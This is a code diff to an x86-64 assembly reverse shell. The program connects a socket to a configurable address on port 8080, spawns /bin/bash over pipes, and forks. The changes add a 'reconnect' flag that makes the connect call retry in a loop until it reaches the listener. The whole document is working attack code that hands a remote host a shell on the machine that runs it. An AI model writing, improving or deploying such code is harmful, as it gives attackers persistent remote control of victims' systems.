@@ -9,7 +9,7 @@ section .bss
     pipefds:
         resq 2
 
-section .data
+section .rodata
     sockaddr istruc sockaddr_in
         at sockaddr_in.sin_family, dw 2         ; AF_INET
         at sockaddr_in.sin_port, dw 0x901F      ; 8080 (CHANGE_ME)
@@ -19,6 +19,7 @@ section .data
     sockaddr_in_size equ $ - sockaddr
 
     bash db "/bin/bash", 0
+    reconnect db 0                              ; 0/1 (CHANGE_ME)
 
 section .text
     global _start
@@ -38,14 +39,18 @@ _start:
     mov rbx, rax
     xor rax, rax
 
+_connect:
     mov rax, 0x2A                   ; connect(sock, (sockaddr*)&sockaddr_in, sizeof(sockaddr_in))
     mov rdi, rbx                    ; sock
     lea rsi, [sockaddr]             ; (sockaddr*)&sockaddr_in
     mov rdx, sockaddr_in_size       ; sizeof(sockaddr_in)
     syscall
 
-    cmp rax, 0
-    jne _end
+    mov rdx, rax
+    movzx rcx, byte [reconnect]
+    and rdx, rcx
+    test rdx, rdx
+    jnz _connect
 
     mov rax, 0x39                   ; fork()
     syscall
@@ -82,4 +87,3 @@ _end:
     mov rax, 0x3C                   ; exit(0)
     mov rdi, 0x00                   ; 0
     syscall
-
